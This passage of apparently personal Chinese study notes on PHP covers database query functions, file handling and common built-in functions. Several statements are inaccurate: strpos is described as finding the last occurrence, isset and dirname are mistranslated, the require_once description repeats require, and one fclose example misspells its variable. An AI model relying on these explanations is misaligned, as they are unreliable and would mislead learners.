允许关闭连接之前的交互超时非活动时间</td></tr></tbody></table></blockquote><h3 id="mysqli-query-函数执行sql命令"><a href="#mysqli-query-函数执行sql命令" class="headerlink" title="mysqli_query()函数执行sql命令"></a>mysqli_query()函数执行sql命令</h3><blockquote><p>语法：</p><p>mysqli_query(<em>connection,query,resultmode</em>)<em>;</em></p><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>connection</em></td><td align="left">必需。规定要使用的 MySQL 连接。</td></tr><tr><td align="left"><em>query</em></td><td align="left">必需，规定查询字符串（要执行的语句）。</td></tr><tr><td align="left"><em>resultmode</em></td><td align="left">可选。一个常量。可以是下列值中的任意一个：MYSQLI_USE_RESULT（如果需要检索大量数据，请使用这个）MYSQLI_STORE_RESULT（默认）</td></tr></tbody></table></blockquote><h3 id="mysql-fetch-array-函数生成关联数组"><a href="#mysql-fetch-array-函数生成关联数组" class="headerlink" title="mysql_fetch_array()函数生成关联数组"></a>mysql_fetch_array()函数生成关联数组</h3><blockquote><p>mysql_fetch_array() 函数从结果集中取得一行作为关联数组，或数字数组，或二者兼有</p><p>返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false。</p><pre><code>mysql_fetch_array(data,array_type)</code></pre><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>data</em></td><td align="left">可选。规定要使用的数据指针。该数据指针是 mysql_query() 函数产生的结果。</td></tr><tr><td align="left"><em>array_type</em></td><td align="left">可选。规定返回哪种结果。可能的值：MYSQL_ASSOC - 关联数组MYSQL_NUM - 数字数组MYSQL_BOTH - 默认。同时产生关联和数字数组</td></tr></tbody></table></blockquote><h2 id="文件处理"><a href="#文件处理" class="headerlink" title="文件处理"></a>文件处理</h2><h3 id="加载文件"><a href="#加载文件" class="headerlink" title="加载文件"></a>加载文件</h3><h4 id="include-文件-requeire-文件"><a href="#include-文件-requeire-文件" class="headerlink" title="include 文件 || requeire 文件"></a>include 文件 || requeire 文件</h4><blockquote><p>include （或 require）语句会获取指定文件中存在的所有文本/代码/标记，并复制到使用 include 语句的文件中。</p><p>包含文件很有用，如果您需要在网站的多张页面上引用相同的 PHP、HTML 或文本的话。</p><p>通过 include 或 require 语句，可以将 PHP 文件的内容插入另一个 PHP 文件（在服务器执行它之前）。</p><ul><li>include 和 require 语句是相同的，除了错误处理方面：<ul><li>require 会生成致命错误（E_COMPILE_ERROR）并停止脚本</li><li>include 只生成警告（E_WARNING），并且脚本会继续</li></ul></li></ul><p>包含文件省去了大量的工作。这意味着您可以为所有页面创建标准页头、页脚或者菜单文件。然后，在页头需要更新时，您只需更新这个页头包含文件即可。</p><ul><li><p>语法：</p><p>  include ‘filename’; 或 require ‘filename’;</p><p>  filename: 必须，文件路径（优先相对路径）</p><p>  使用include || require 命令的位置就是代码嵌入的位置</p></li></ul><p>php中被包含的文件是单独编译的</p><p><img src="image-20210403195725604.png" alt="image-20210403195725604"></p></blockquote><h3 id="创建文件"><a href="#创建文件" class="headerlink" title="创建文件"></a>创建文件</h3><h4 id="fopen-函数创建文件"><a href="#fopen-函数创建文件" class="headerlink" title="fopen()函数创建文件"></a>fopen()函数创建文件</h4><blockquote><p>fopen() 函数也用于创建文件</p><p>在 PHP 中，创建文件所用的函数与打开文件的相同。</p><p>如果用 fopen() 打开并不存在的文件，此函数会创建文件</p><p>语法：<strong>fopen(“[文件名称]”，”[打开方式]”)</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$buildfile</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"text.txt"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>打开方式：</strong></p><table><thead><tr><th align="left">模式</th><th align="center">描述</th></tr></thead><tbody><tr><td align="left">r</td><td align="center">只读。在文件的开头开始。</td></tr><tr><td align="left">r+</td><td align="center">读/写。在文件的开头开始。</td></tr><tr><td align="left">w</td><td align="center">只写。打开并清空文件的内容；如果文件不存在，则创建新文件。</td></tr><tr><td align="left">w+</td><td align="center">读/写。打开并清空文件的内容；如果文件不存在，则创建新文件。</td></tr><tr><td align="left">a</td><td align="center">追加。打开并向文件末尾进行写操作，如果文件不存在，则创建新文件。</td></tr><tr><td align="left">a+</td><td align="center">读/追加。通过向文件末尾写内容，来保持文件内容。</td></tr><tr><td align="left">x</td><td align="center">只写。创建新文件。如果文件已存在，则返回 FALSE 和一个错误。</td></tr><tr><td align="left">x+</td><td align="center">读/写。创建新文件。如果文件已存在，则返回 FALSE 和一个错误。</td></tr></tbody></table></blockquote><h4 id="fclose-函数关闭文件"><a href="#fclose-函数关闭文件" class="headerlink" title="fclose()函数关闭文件"></a>fclose()函数关闭文件</h4><blockquote><p>同之前版本的python ，php 操作文件后也需要关闭操作</p><p>与创建文件命令同时使用</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$buildfile</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"text"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$bulidfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></blockquote><h4 id="feof-函数检测是否达到文件末尾"><a href="#feof-函数检测是否达到文件末尾" class="headerlink" title="feof()函数检测是否达到文件末尾"></a>feof()函数检测是否达到文件末尾</h4><blockquote><p>feof() 函数检测是否已到达文件末尾（EOF）。</p><p>在循环遍历未知长度的数据时，feof() 函数很有用。</p><p>在 w 、a 和 x 模式下，无法读取打开的文件！</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">if</span>（<span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$buildfile</span><span class="token punctuation">)</span>） <span class="token keyword">echo</span> <span class="token string">"文件已到结束"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><h4 id="fgets-函数逐行读取文件"><a href="#fgets-函数逐行读取文件" class="headerlink" title="fgets()函数逐行读取文件"></a>fgets()函数逐行读取文件</h4><blockquote><p>fgets() 函数用于从文件中逐行读取文件。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"welcome.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"无法打开文件!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 读取文件每一行，直到文件结尾</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">.</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="fgetc-函数逐字符读取文件"><a href="#fgetc-函数逐字符读取文件" class="headerlink" title="fgetc()函数逐字符读取文件"></a>fgetc()函数逐字符读取文件</h4><blockquote><p>fgetc() 函数用于从文件中逐字符地读取文件。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"welcome.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"无法打开文件!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token function">fgetc</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="fwrite-函数写入文件"><a href="#fwrite-函数写入文件" class="headerlink" title="fwrite()函数写入文件"></a>fwrite()函数写入文件</h4><blockquote><p>fwrite() 的第一个参数包含要写入的文件的文件名，第二个参数是被写的字符串。</p><p>语法：</p><p>fwrite(“text.txt”,”hello world!”)</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$buildfile</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"text.txt"</span><span class="token punctuation">,</span><span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"创建文件失败"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token string">"Hello World!\n"</span><span class="token punctuation">;</span>    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$buildfile</span><span class="token punctuation">,</span><span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$buildfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当文件中原本就有内容新写入的内容将会覆盖原来的内容</p></blockquote><h4 id="file-put-contents-函数将字符串写入文件"><a href="#file-put-contents-函数将字符串写入文件" class="headerlink" title="file_put_contents()函数将字符串写入文件"></a>file_put_contents()函数将字符串写入文件</h4><blockquote><ol><li>如果设置了 FILE_USE_INCLUDE_PATH，那么将检查 <em>filename</em> 副本的内置路径</li><li>如果文件不存在，将创建一个文件</li><li>打开文件</li><li>如果设置了 LOCK_EX，那么将锁定文件</li><li>如果设置了 FILE_APPEND，那么将移至文件末尾。否则，将会清除文件的内容</li><li>向文件中写入数据</li><li>关闭文件并对所有文件解锁</li></ol><p>如果成功，该函数将返回写入文件中的字符数。如果失败，则返回 False。</p><p>语法：</p><p><strong>file_put_contents(“文件名/路径”,”字符串/数据”)</strong></p></blockquote><h4 id="file-get-contents-函数获取文件内容"><a href="#file-get-contents-函数获取文件内容" class="headerlink" title="file_get_contents()函数获取文件内容"></a>file_get_contents()函数获取文件内容</h4><blockquote><p>语法：</p><p><strong>fille_get_contents(‘文件名’);</strong></p></blockquote><h2 id="函数创建"><a href="#函数创建" class="headerlink" title="函数创建"></a>函数创建</h2><ul><li>function方法<blockquote><p>自定义函数<br>语法：<br>function <a href="">函数名</a><br>{<br> //要执行的代码<br>}<br>自定义函数调用示例：</p><?phpfunction writeName(){    echo "Atmujie";}</blockquote>echo “My name is “;<br>writeName();<br>?&gt;<br>输出结果：My name is Atmujie  </li></ul><h2 id="内置函数解析"><a href="#内置函数解析" class="headerlink" title="内置函数解析"></a>内置函数解析</h2><h3 id="json函数"><a href="#json函数" class="headerlink" title="json函数"></a>json函数</h3><blockquote><table><thead><tr><th><strong>json_encode</strong></th><th><strong>对变量进行json编码</strong></th></tr></thead><tbody><tr><td><strong>json_decode</strong></td><td><strong>对json格式的字符串进行解码，转换为php变量</strong></td></tr><tr><td><strong>json_last_error</strong></td><td><strong>返回最后发生的错误</strong></td></tr></tbody></table><p><strong>在函数中返回一个数组时，要用json函数</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">function</span> <span class="token function">abc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'aa'</span><span class="token operator">=</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'bb'</span><span class="token operator">=</span><span class="token operator">></span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">abc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//结果{"aa":1,"bb":2}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="assert-函数检查表达式是否成立"><a href="#assert-函数检查表达式是否成立" class="headerlink" title="assert()函数检查表达式是否成立"></a>assert()函数检查表达式是否成立</h3><blockquote><p>php中assert函数用来检查表达式是否成立，返回ture or flase</p><p>主要用来debug（调试）</p><p>语法：assert(mixed[类型说明] $assertion[断言])</p><p><strong>如果 <code>assertion</code> 是字符串，它将会被 assert() 当做 PHP 代码来执行。</strong></p><pre><code>assertion</code></pre><p>断言。在PHP 5中，它必须是要评估的字符串或要测试的布尔值。在PHP 7中，这也可以是任何返回值的表达式，该表达式将被执行并将结果用于指示断言是成功还是失败。</p><pre><code>description</code></pre><p>如果 <code>assertion</code> 失败了，选项 description 将会包括在失败信息里。</p><pre><code>exception</code></pre><p>在PHP 7中，第二个参数可以是 <strong>Throwable</strong>对象，而不是描述性 字符串，在这种情况下，这是断言失败并且 启用<a href="https://www.php.net/manual/zh/info.configuration.php#ini.assert.exception">assert.exception</a>配置指令时将抛出的对象 。</p></blockquote><h3 id="isset-函数"><a href="#isset-函数" class="headerlink" title="isset()函数"></a>isset()函数</h3><blockquote><p>isset 译为：弹出</p><p>功能：检测变量是否已设置并且非null</p><p>语法：isset($var,$…=?)</p><p>$var:要检查的变量</p><p>如果 <code>var</code> 存在并且值不是 <strong><code>null</code></strong> 则返回 **<code>true</code>**，否则返回 **<code>false</code>**。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">array</span> <span class="token punctuation">(</span><span class="token string">'test'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'hello'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">NULL</span><span class="token punctuation">,</span> <span class="token string">'pie'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">'apple'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token string">'test'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// TRUE</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token string">'foo'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment" spellcheck="true">// FALSE</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token string">'hello'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment" spellcheck="true">// FALSE</span><span class="token comment" spellcheck="true">// 键 'hello' 的值等于 NULL，所以被认为是未置值的。</span><span class="token comment" spellcheck="true">// 如果想检测 NULL 键值，可以试试下边的方法。 </span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string">'hello'</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// TRUE</span><span class="token comment" spellcheck="true">// Checking deeper array values</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token string">'pie'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// TRUE</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token string">'pie'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// FALSE</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token string">'cake'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// FALSE</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="highlight-file-函数"><a href="#highlight-file-函数" class="headerlink" title="highlight_file()函数"></a>highlight_file()函数</h3><blockquote><p>对文件进行语法高亮显示<br> high高的，light光 highlight高亮<br> 语法：highlight_file(filename,return)<br> filename:必须，要进行高亮处理的路径<br> return:可选，如果为trun 则返回高亮处理的代码  </p></blockquote><h3 id="dirname-函数"><a href="#dirname-函数" class="headerlink" title="dirname()函数"></a>dirname()函数</h3><blockquote><p>返回路径中的目录部分<br> dirname 译为：文件名<br> 语法：<br> dirname(filename)<br> filename:必要，文件路径    </p></blockquote><h3 id="array-函数"><a href="#array-函数" class="headerlink" title="array()函数"></a>array()函数</h3><blockquote><p>创建一个数组<br>语法：$a = array();    </p><p>举例：</p><p><img src="image-20210417143743209.png" alt="image-20210417143743209"></p></blockquote><h3 id="count-函数"><a href="#count-函数" class="headerlink" title="count()函数"></a>count()函数</h3><blockquote><p>返回数组长度<br> 语法：$b = count($a);  </p></blockquote><h3 id="serialize-函数"><a href="#serialize-函数" class="headerlink" title="serialize()函数"></a>serialize()函数</h3><blockquote><p>将指定的字符串进行序列化        </p></blockquote><h3 id="exit-函数"><a href="#exit-函数" class="headerlink" title="exit()函数"></a>exit()函数</h3><blockquote><p>输出一条消息，并退出当前脚本<br>语法：exit(status)<br>status:必须，规定退出脚本之前写入的消息或状态号。状态号不会被写入输出。</p><p>如果 <em>status</em> 是字符串，则该函数会在退出前输出字符串。</p><p>如果 <em>status</em> 是整数，这个值会被用作退出状态。退出状态的值在 0 至 254 之间。退出状态 255 由 PHP 保留，不会被使用。状态 0 用于成功地终止程序。</p></blockquote><h3 id="mb-substr-函数用于获取一部分字符串"><a href="#mb-substr-函数用于获取一部分字符串" class="headerlink" title="mb_substr()函数用于获取一部分字符串"></a>mb_substr()函数用于获取一部分字符串</h3><blockquote><p>语法：</p><p><strong>mb_substr ( string【要提取的字符串】 , int【开始位置】 , int <code>$length</code> = NULL , string <code>$encoding</code> =【字符串编码】)</strong> </p><p><strong>结果为string</strong></p><p><strong>$length表示读取的字符串个数，省略或传入NULL则提取到尾部</strong></p><p><strong>不就是mysql的substr()语句</strong></p></blockquote><h3 id="mb-strpos-函数用于查找字符串在另一个字符串中首次出现的位置"><a href="#mb-strpos-函数用于查找字符串在另一个字符串中首次出现的位置" class="headerlink" title="mb_strpos()函数用于查找字符串在另一个字符串中首次出现的位置"></a>mb_strpos()函数用于查找字符串在另一个字符串中首次出现的位置</h3><blockquote><p>语法：</p><p><strong>mb_strpos ( string (要检查的字符串), string （要查找的字符串） , int <code>$offset</code> = 0 , string <code>$encoding</code> = 【字符串编码 )</strong> </p><p><strong>$offset搜索位置的偏移。如果没有提供该参数，将会使用 0。负数的 offset 会从字符串尾部开始统计。</strong></p><p><strong>结果为int</strong></p></blockquote><h3 id="header-函数向客户端发送原始的-HTTP-报头。"><a href="#header-函数向客户端发送原始的-HTTP-报头。" class="headerlink" title="header()函数向客户端发送原始的 HTTP 报头。"></a>header()函数向客户端发送原始的 HTTP 报头。</h3><blockquote><p>语法：header(string,replace,http_response_code)</p><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">string</td><td align="left">必需。规定要发送的报头字符串。</td></tr><tr><td align="left">replace</td><td align="left">可选。指示该报头是否替换之前的报头，或添加第二个报头。默认是 true（替换）。false（允许相同类型的多个报头）。</td></tr><tr><td align="left">http_response_code</td><td align="left">可选。把 HTTP 响应代码强制为指定的值。（PHP 4 以及更高版本可用）</td></tr></tbody></table><ul><li><p>实现页面跳转</p><blockquote><p><strong>header(Location: url);</strong> location 译为：位置</p></blockquote></li></ul></blockquote><h3 id="get-class-函数返回对象的类名"><a href="#get-class-函数返回对象的类名" class="headerlink" title="get_class()函数返回对象的类名"></a>get_class()函数返回对象的类名</h3><blockquote><p>语法：get_class ( object <code>$object</code> = <strong><code>null</code></strong> ) : string</p><p>返回对象实例 <code>object</code> 所属类的名字。</p></blockquote><h3 id="strpos-函数查找字符串在另一字符串中最后一次出现的位置"><a href="#strpos-函数查找字符串在另一字符串中最后一次出现的位置" class="headerlink" title="strpos()函数查找字符串在另一字符串中最后一次出现的位置"></a>strpos()函数查找字符串在另一字符串中最后一次出现的位置</h3><blockquote><p>strpos()函数对大小写敏感</p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">strrpos</span><span class="token punctuation">(</span>string<span class="token punctuation">,</span>find<span class="token punctuation">,</span>start<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//string：要搜索的字符串</span> <span class="token comment" spellcheck="true">//find:要查找的字符串</span> <span class="token comment" spellcheck="true">//start:可选，从何处搜索</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>返回字符串在另一字符串中最后一次出现的位置，如果没有找到字符串则返回 FALSE。</strong></p></blockquote><h3 id="require-与require-once-amp-amp-include-与include-once-包含文件"><a href="#require-与require-once-amp-amp-include-与include-once-包含文件" class="headerlink" title="require()与require_once()&amp;&amp;include() 与include_once()包含文件"></a>require()与require_once()&amp;&amp;include() 与include_once()包含文件</h3><blockquote><p><strong>三者都是包含文件</strong></p><p><strong>include()【包含】 读入指定文件并执行其中的程序</strong></p><p><strong>require()【请求】会将目标文件的内容读入，并且把自己本身代换成这些读入的内容；</strong></p><p><strong>include_once() 【包含一次】 和 include 语句类似，唯一区别是如果该文件中已经被包含过，则不会再次包含。如同此语句名字暗示的那样，只会包含一次；</strong></p><p><strong>require()【请求一次】 和 require 语句完全相同，唯一区别是 PHP 会检查该文件是否已经被包含过，如果是则不会再次包含</strong></p></blockquote><h4 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h4><blockquote><p>require() 语句的性能与 include() 相类似，都是包括并运行指定文件。不同之处在于：对 include() 语句来说，在执行文件时每次都要进行读取和评估；而对于 require() 来说，文件只处理一次（实际上，文件内容替换 require() 语句）。</p><p><strong>简单来说，include包含文件时的运行步骤是先运行被包含的文件，然后将结果带入自身代码中执行</strong></p><p><strong>require不同，reauire是先把被包含文件的整个代码放入自身文件，再运行自身放入代码后的文件</strong></p><p><strong>就是先执行和先包含的关系</strong></p><p>这就意味着如果可能执行多次的代码，则使用 require() 效率比较高。另外一方面，如果每次执行代码时是读取不同的文件，或者有通过一组文件迭代的循环，就使用 include() 语句。</p></blockquote><h3 id="time-函数返回当前时间戳，并格式化为日期："><a href="#time-函数返回当前时间戳，并格式化为日期：" class="headerlink" title="time()函数返回当前时间戳，并格式化为日期："></a>time()函数返回当前时间戳，并格式化为日期：</h3><blockquote><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$t</span><span class="token operator">=</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$t</span> <span class="token punctuation">.</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"Y-m-d"</span><span class="token punctuation">,</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//1621153043</span><span class="token comment" spellcheck="true">//2021-05-16</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="mail-函数-发送电子邮件"><a href="#mail-函数-发送电子邮件" class="headerlink" title="mail()函数 发送电子邮件"></a>mail()函数 发送电子邮件</h3><p>mail() 函数允许您从脚本中直接发送电子邮件。</p><p>如果电子邮件的投递被成功地接受，则返回 TRUE，否则返回 FALSE。</p><h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><p>mail(to,subject,message,headers,parameters)</p><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">to</td><td align="left">必需。规定电子邮件的接收者。</td></tr><tr><td align="left">subject</td><td align="left">必需。规定电子邮件的主题。<strong>注释：</strong>该参数不能包含任何换行字符。</td></tr><tr><td align="left">message</td><td align="left">必需。定义要发送的消息。用 LF（\n）将每一行分开。行不应超过70个字符。<strong>Windows 注释：</strong>当 PHP 直接连接到 SMTP 服务器时，如果在消息的某行开头发现一个句号，则会被删掉。要解决这个问题，请将单个句号替换成两个句号： <?php $txt = str_replace("n.", "n..", $txt); ?></td></tr><tr><td align="left">headers</td><td align="left">可选。规定额外的报头，比如 From、Cc 和 Bcc。附加标头应该用 CRLF（\r\n）分开。<strong>注释：</strong>发送电子邮件时，它必须包含一个 From 标头。可通过该参数进行设置或在 php.ini 文件中进行设置。</td></tr><tr><td align="left">parameters</td><td align="left">可选。规定 sendmail 程序的额外参数（在 sendmail_path 配置设置中定义）。例如：当 sendmail 和 -f sendmail 的选项一起使用时，sendmail 可用于设置发件人地址。</td></tr></tbody></table><h3 id="substr-count-子序列计数"><a href="#substr-count-子序列计数" class="headerlink" title="substr_count() 子序列计数"></a>substr_count() 子序列计数</h3><p>substr_count()函数用于计数某些字符在整个字符串中出现的个数</p><h2 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">substr_count</span><span class="token punctuation">(</span>string<span class="token punctuation">,</span>substring<span class="token punctuation">,</span>start<span class="token punctuation">,</span>length<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>string</em></td><td align="left">必需。规定被检查的字符串。</td></tr><tr><td align="left"><em>substring</em></td><td align="left">必需。规定要搜索的字符串。</td></tr><tr><td align="left"><em>start</em></td><td align="left">可选。规定在字符串中何处开始搜索。</td></tr><tr><td align="left"><em>length</em></td><td align="left">可选。规定搜索的长度。</td></tr></tbody></table><p><strong>注释：</strong>子串是区分大小写的。</p><p><strong>注释：</strong>该函数不计数重叠的子串（参见例子 2）。</p><p><strong>注释：</strong>如果 <em>start</em> 参数加上 <em>length</em> 参数大于字符串长度，则该函数生成一个警告（参见例子 3）。</p><p>例一</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">'abcdaabcaabaa'</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">substr_count</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token shell-comment comment"># 7 </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>例二</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string">'abcabca'</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">substr_count</span><span class="token punctuation">(</span><span class="token 